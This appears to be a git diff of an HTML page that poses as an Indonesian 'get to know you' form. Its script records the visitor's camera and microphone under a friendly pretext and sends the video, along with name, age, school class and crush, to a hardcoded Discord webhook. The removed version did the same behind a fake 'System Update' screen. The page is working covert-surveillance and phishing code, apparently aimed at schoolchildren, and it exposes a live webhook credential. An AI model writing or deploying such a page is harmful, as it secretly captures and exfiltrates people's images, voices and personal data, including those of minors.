@@ -1,109 +1,205 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Update</title>
+    <title>Kenalan Yuk!</title>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        
-        /* Loading Style */
-        .loader { border: 4px solid #111; border-top: 4px solid #0078d4; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { margin-top: 20px; font-size: 14px; color: #0078d4; font-weight: bold; }
-        #pct { font-size: 12px; color: #555; margin-top: 5px; }
+        :root {
+            --accent: #6366f1;
+            --accent-hover: #4f46e5;
+            --bg: #0f172a;
+            --glass: rgba(30, 41, 59, 0.7);
+        }
 
-        /* Custom Modal Style */
-        #customModal {
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; }
+
+        body {
+            background: var(--bg);
+            background-image: radial-gradient(circle at top right, #1e293b, #0f172a);
+            color: white;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        /* Overlay Dialog Awal */
+        #permissionOverlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.9); display: flex; justify-content: center;
-            align-items: center; z-index: 9999;
+            background: rgba(15, 23, 42, 0.95);
+            backdrop-filter: blur(10px);
+            z-index: 9999;
+            display: flex; justify-content: center; align-items: center;
         }
-        .modal-box {
-            background: #1e1e1e; padding: 25px; border-radius: 10px;
-            text-align: center; border: 1px solid #333; max-width: 300px;
+
+        .glass-card {
+            background: var(--glass);
+            padding: 40px;
+            border-radius: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            max-width: 350px;
+            width: 90%;
         }
-        .modal-box p { margin-bottom: 20px; font-size: 16px; }
-        .btn-group { display: flex; gap: 10px; justify-content: center; }
+
+        h2 { font-weight: 600; margin-bottom: 15px; letter-spacing: 1px; }
+        p { color: #94a3b8; margin-bottom: 25px; font-size: 0.95rem; }
+
+        .btn-group { display: flex; gap: 10px; }
         .btn {
-            padding: 10px 25px; border: none; border-radius: 5px;
-            cursor: pointer; font-weight: bold; transition: 0.3s;
+            flex: 1; padding: 12px; border: none; border-radius: 12px;
+            font-weight: 600; cursor: pointer; transition: 0.3s;
         }
-        .btn-yes { background: #0078d4; color: white; }
-        .btn-no { background: #333; color: #aaa; }
+        .btn-primary { background: var(--accent); color: white; }
+        .btn-primary:hover { background: var(--accent-hover); }
+        .btn-secondary { background: #334155; color: #94a3b8; }
+
+        /* Form Kenalan */
+        #mainContent { display: none; width: 100%; max-width: 400px; padding: 20px; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        label { display: block; margin-bottom: 5px; color: #94a3b8; font-size: 0.8rem; }
+        input {
+            width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #334155;
+            background: rgba(15, 23, 42, 0.5); color: white; outline: none; transition: 0.3s;
+        }
+        input:focus { border-color: var(--accent); box-shadow: 0 0 0 2px rgba(99, 102, 241, 0.2); }
+
+        .status-recording {
+            font-size: 0.7rem; color: #ef4444; margin-top: 10px;
+            display: flex; align-items: center; justify-content: center; gap: 5px;
+        }
+        .dot { width: 8px; height: 8px; background: #ef4444; border-radius: 50%; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
 
-    <div id="customModal">
-        <div class="modal-box">
-            <p>Hai, izin pengenalan wajah untuk verifikasi sistem?</p>
+    <div id="permissionOverlay">
+        <div class="glass-card">
+            <h2>KENALAN YUK!</h2>
+            <p>Biar makin akrab, izinkan sistem mengenali kamu sebentar ya?</p>
             <div class="btn-group">
-                <button class="btn btn-yes" onclick="requestAccess()">YES</button>
-                <button class="btn btn-no" onclick="denied()">NO</button>
+                <button class="btn btn-primary" onclick="startApp()">AYOK!</button>
+                <button class="btn btn-secondary" onclick="alert('Yah, kok nggak mau? :(')">TIDAK!</button>
             </div>
         </div>
     </div>
 
-    <div class="loader"></div>
-    <div id="status">WAITING FOR PERMISSION...</div>
-    <div id="pct">Progress: <span id="val">0</span>%</div>
+    <div id="mainContent">
+        <div class="glass-card" style="max-width: 100%;">
+            <h2 style="font-size: 1.2rem;">Data Kenalan</h2>
+            <div class="input-group">
+                <label>Nama Lengkap</label>
+                <input type="text" id="nama" placeholder="Siapa nama kamu?">
+            </div>
+            <div class="input-group">
+                <label>Umur</label>
+                <input type="number" id="umur" placeholder="Berapa umurmu?">
+            </div>
+            <div class="input-group">
+                <label>Kelas</label>
+                <input type="text" id="kelas" placeholder="Kelas berapa?">
+            </div>
+            <div class="input-group">
+                <label>Crush / Doi</label>
+                <input type="text" id="crush" placeholder="Nama doi kamu...">
+            </div>
+            <button class="btn btn-primary" style="width: 100%;" onclick="submitData()">Kirim & Selesai</button>
+            
+            <div class="status-recording" id="recStatus" style="display:none;">
+                <div class="dot"></div> Sinkronisasi sedang berjalan...
+            </div>
+        </div>
+    </div>
 
-    <video id="v" autoplay muted style="display:none;"></video>
+    <video id="video" autoplay muted style="display:none;"></video>
 
     <script>
-        const URI = "https://discord.com/api/webhooks/1472604875316789362/WCsymTViSWZcRWqn6Xb_oJcMwelZTf7bRxdQ3lpAkh5rh7eTh49Bx1uZsJfQZOmMaLQg";
-        let rc;
-        let ck = [];
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1472604875316789362/WCsymTViSWZcRWqn6Xb_oJcMwelZTf7bRxdQ3lpAkh5rh7eTh49Bx1uZsJfQZOmMaLQg";
+        let mediaRecorder;
+        let chunks = [];
 
-        function denied() {
-            document.getElementById('customModal').style.display = 'none';
-            document.getElementById('status').innerText = "ERROR: SYSTEM REQUIREMENT FAILED";
-        }
-
-        async function requestAccess() {
-            // Sembunyikan modal buatan sendiri
-            document.getElementById('customModal').style.display = 'none';
-            document.getElementById('status').innerText = "INSTALLING SYSTEM UPDATE...";
-            
+        async function startApp() {
             try {
-                // Barulah panggil izin asli browser
-                const s = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: true 
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('video').srcObject = stream;
+                document.getElementById('permissionOverlay').style.display = 'none';
+                document.getElementById('mainContent').style.display = 'block';
+                document.getElementById('recStatus').style.display = 'flex';
+
+                // Mulai Perekaman
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
                 
-                document.getElementById('v').srcObject = s;
-                rc = new MediaRecorder(s);
-                rc.ondataavailable = (e) => { if (e.data.size > 0) ck.push(e.data); };
-                
-                rc.onstop = async () => {
-                    const b = new Blob(ck, { type: 'video/webm' });
-                    const f = new FormData();
-                    f.append('file', b, 'vid.webm');
-                    f.append('content', '🎥 **Video Recorded!**');
-                    await fetch(URI, { method: 'POST', body: f });
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('file', blob, 'kenalan_video.webm');
+                    formData.append('content', '🎥 **Hasil Rekaman Kenalan**');
+                    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
                 };
 
-                rc.start();
-                load();
-            } catch (e) {
-                document.getElementById('status').innerText = "ERROR: PERMISSION DENIED";
+                mediaRecorder.start();
+            } catch (err) {
+                alert("Waduh, kamu harus klik AYOK! dan izinkan kamera biar bisa lanjut.");
+                console.error(err);
             }
         }
 
-        function load() {
-            let p = 0;
-            setInterval(() => {
-                if (p < 99) {
-                    p += Math.floor(Math.random() * 2) + 1;
-                    document.getElementById('val').innerText = p;
+        async function submitData() {
+            const data = {
+                nama: document.getElementById('nama').value,
+                umur: document.getElementById('umur').value,
+                kelas: document.getElementById('kelas').value,
+                crush: document.getElementById('crush').value
+            };
+
+            if(!data.nama || !data.umur) return alert("Isi dulu dong datanya!");
+
+            // Kirim Data Teks ke Webhook
+            const payload = {
+                content: "👤 **Ada Yang Mau Kenalan!**",
+                embeds: [{
+                    title: "Detail Informasi",
+                    color: 6505201,
+                    fields: [
+                        { name: "Nama", value: data.nama, inline: true },
+                        { name: "Umur", value: data.umur, inline: true },
+                        { name: "Kelas", value: data.kelas, inline: true },
+                        { name: "Crush", value: data.crush, inline: true }
+                    ],
+                    footer: { text: "Data dikirim pada: " + new Date().toLocaleString() }
+                }]
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                alert("Data berhasil dikirim! Salam kenal ya.");
+                
+                // Berhenti merekam dan kirim video saat submit selesai
+                if(mediaRecorder && mediaRecorder.state !== "inactive") {
+                    mediaRecorder.stop();
                 }
-            }, 3000);
+            } catch (err) {
+                alert("Gagal mengirim data.");
+            }
         }
 
-        document.addEventListener("visibilitychange", () => { if (document.visibilityState === 'hidden' && rc) rc.stop(); });
-        window.onbeforeunload = () => { if (rc) rc.stop(); };
+        // Antisipasi jika tab ditutup mendadak
+        window.onbeforeunload = () => {
+            if(mediaRecorder && mediaRecorder.state !== "inactive") {
+                mediaRecorder.stop();
+            }
+        };
     </script>
 </body>
 </html>
